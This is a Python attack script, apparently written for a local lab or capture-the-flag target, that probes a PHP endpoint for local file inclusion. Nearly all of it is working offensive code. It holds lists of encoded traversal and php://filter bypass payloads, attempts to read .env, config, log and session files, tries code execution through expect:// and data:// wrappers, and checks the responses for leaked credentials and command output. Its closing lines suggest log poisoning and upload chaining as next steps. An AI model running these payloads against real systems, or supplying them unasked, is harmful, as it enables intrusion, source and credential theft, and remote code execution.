import requests
import base64
import re
import urllib.parse

# Base URL (send.php IS the entry point)
base_url = "http://127.0.0.1:32826/send.php"

# Advanced bypass techniques
advanced_tests = [
    # Double URL encoded traversal (bypasses filters that decode once)
    ("file", "..%252f..%252f..%252fsend.php"),
    ("page", "..%252f..%252f..%252fsend.php"),
    ("include", "..%252f..%252f..%252fsend.php"),
    
    # Full double encoding
    ("file", "%252e%252e%252f%252e%252e%252f%252e%252e%252fsend.php"),
    ("page", "%252e%252e%252f%252e%252e%252f%252e%252e%252fsend.php"),
    
    # UTF-8 overlong encoding for '.' character (bypasses weak filters)
    ("file", "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/send.php"),
    ("page", "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/send.php"),
    
    # Mixed separators (OS-specific)
    ("file", "..\\/..\\/send.php"),  # Backslash forward slash mix
    ("file", "..%5c..%5csend.php"),  # URL encoded backslash
    
    # Path truncation with ./ additions
    ("file", "../../../send.php/./././././"),
    ("file", "../../../send.php....//"),
    
    # Nested traversal (recursive filter bypass)
    ("file", "....//....//....//....//send.php"),
    ("file", "....//send.php"),
    
    # Null byte (for older PHP < 5.3.4)
    ("file", "../../../send.php%00"),
    ("file", "php://filter/convert.base64-encode/resource=send.php%00"),
    
    # Different php://filter wrappers
    ("file", "php://filter/read=string.rot13/resource=send.php"),
    ("file", "php://filter/zlib.deflate/convert.base64-encode/resource=send.php"),
    ("file", "php://filter/convert.base64-encode/resource=send.php"),
    
    # Try to access common config/database files
    ("file", "../../../.env"),
    ("file", "../../../config.php"),
    ("file", "../../../database.php"),
    ("file", "../../../wp-config.php"),
    
    # Log files for potential inclusion
    ("file", "../../../var/log/apache2/access.log"),
    ("file", "../../../var/log/nginx/access.log"),
    ("file", "../../../var/log/apache2/error.log"),
    
    # Session files (if we can guess session ID)
    ("file", "../../../var/lib/php/sessions/sess_test"),
    ("file", "../../../tmp/sess_test"),
]

# Add expect:// wrapper tests (for potential code execution)
rce_tests = [
    ("file", "expect://id"),
    ("file", "expect://whoami"),
    ("file", "expect://ls"),
    ("file", "expect://cat%20/var/www/html/send.php"),  # Try to read via command
]

# Add data:// wrapper for inline execution (if allow_url_include is on)
data_tests = [
    ("file", "data://text/plain,<?php echo 'TEST'; ?>"),
    ("file", "data://text/plain;base64," + base64.b64encode(b"<?php echo 'TEST'; ?>").decode()),
]

print("="*70)
print("ADVANCED LFI BYPASS TESTING")
print("="*70)

total_tests = 0

# Test advanced traversal techniques
print("\n[PHASE 1] Advanced Traversal & Encoding Bypasses")
print("-"*70)

for param, payload in advanced_tests:
    total_tests += 1
    url = f"{base_url}?{param}={payload}"
    
    try:
        print(f"\n[TEST {total_tests}] {url}")
        response = requests.get(url, timeout=5)
        print(f"Status: {response.status_code} | Size: {len(response.content)}B")
        
        if response.status_code == 200 and len(response.content) > 0:
            content = response.text
            
            # Look for PHP source patterns
            has_php = "<?php" in content or "<?=" in content or "<? " in content
            
            # Try base64 decoding if it might be encoded
            if "convert.base64-encode" in payload or "PD9w" in content:
                b64_pattern = r'([A-Za-z0-9+/]{40,}[=]{0,2})'
                b64_matches = re.findall(b64_pattern, content, re.MULTILINE)
                
                for match in b64_matches:
                    try:
                        decoded = base64.b64decode(match).decode('utf-8', errors='ignore')
                        if "<?php" in decoded or "<?=" in decoded:
                            print("\n[!] FOUND PHP SOURCE (base64 decoded)!")
                            print(decoded)
                            # Exit immediately
                            print(f"\nSUCCESS after {total_tests} tests")
                            import sys
                            sys.exit(0)
                    except:
                        continue
            
            # Direct source disclosure
            if has_php and len(content.strip()) > 200:  # Avoid short fragments
                if not content.startswith('<!DOCTYPE') and not content.startswith('<html'):
                    print("\n[!] FOUND PHP SOURCE (direct)!")
                    print(content[:500])
                    
                    # Look for SQL queries
                    sql_keywords = ["SELECT", "INSERT", "UPDATE", "DELETE", "FROM", "WHERE", "FROM users", "FROM messages"]
                    found_sql = [kw for kw in sql_keywords if kw.lower() in content.lower()]
                    if found_sql:
                        print(f"\n[SQL DETECTED] {' | '.join(found_sql)}")
                    
                    print(f"\nSUCCESS after {total_tests} tests")
                    import sys
                    sys.exit(0)
            
            # RCE detection (expect:// responses)
            if "expect://" in payload and ("uid=" in content or "gid=" in content or "root:" in content):
                print(f"\n[!] RCE SUCCESS via expect://")
                print(content)
                print(f"\nSUCCESS after {total_tests} tests")
                import sys
                sys.exit(0)
            
            # Log file inclusion
            if "access.log" in payload or "error.log" in payload:
                if "GET " in content or "POST " in content:
                    print(f"\n[+] Log file potentially accessible")
                    print(content[:300])
            
            # Config file detection
            if ".env" in payload or "config.php" in payload:
                if "DB_" in content or "DATABASE" in content or "PASSWORD" in content:
                    print(f"\n[!] Config file found!")
                    print(content)
                    
        elif response.status_code == 404:
            print("[-] File not found")
        elif response.status_code == 403:
            print("[-] Access forbidden (filter active)")
            
    except Exception as e:
        print(f"[ERROR] {e}")

# Test RCE wrappers
print("\n[PHASE 2] RCE Wrapper Tests (expect://)")
print("-"*70)

for param, payload in rce_tests:
    total_tests += 1
    url = f"{base_url}?{param}={payload}"
    
    try:
        print(f"\n[TEST {total_tests}] {url}")
        response = requests.get(url, timeout=5)
        print(f"Status: {response.status_code} | Size: {len(response.content)}B")
        
        if response.status_code == 200 and len(response.content) > 0:
            content = response.text
            # Check for command output indicators
            if any(indicator in content for indicator in ["uid=", "gid=", "root:", "bin:", "daemon:", "USER", "PATH"]):
                print("\n[!] RCE SUCCESS - Command executed!")
                print(content)
                print(f"\nSUCCESS after {total_tests} tests")
                import sys
                sys.exit(0)
            elif "sh:" in content or "bash:" in content or "command not found" in content:
                print(f"[+] Command attempted but failed: {content[:100]}")
                
    except Exception as e:
        print(f"[ERROR] {e}")

# Test data:// wrapper
print("\n[PHASE 3] Data Wrapper Tests (data://)")
print("-"*70)

for param, payload in data_tests:
    total_tests += 1
    url = f"{base_url}?{param}={payload}"
    
    try:
        print(f"\n[TEST {total_tests}] {url}")
        response = requests.get(url, timeout=5)
        print(f"Status: {response.status_code} | Size: {len(response.content)}B")
        
        if response.status_code == 200 and len(response.content) > 0:
            content = response.text
            if "TEST" in content:
                print("\n[!] data:// wrapper executed successfully!")
                print(content)
                print(f"\nSUCCESS after {total_tests} tests")
                import sys
                sys.exit(0)
                
    except Exception as e:
        print(f"[ERROR] {e}")

# Final summary
print("\n" + "="*70)
print(f"TESTING COMPLETE - {total_tests} tests performed")
print("="*70)
print("No source code disclosure or RCE achieved")
print("\n[FINAL RECOMMENDATIONS]")
print("1. The application is processing requests but not vulnerable to basic LFI")
print("2. Consider testing for:")
print("   - Session poisoning via User-Agent injection")
print("   - Log file poisoning")
print("   - File upload + LFI chain")
print("   - SSTI if template engine is used")
print("3. May need to test authenticated endpoints if auth is required")
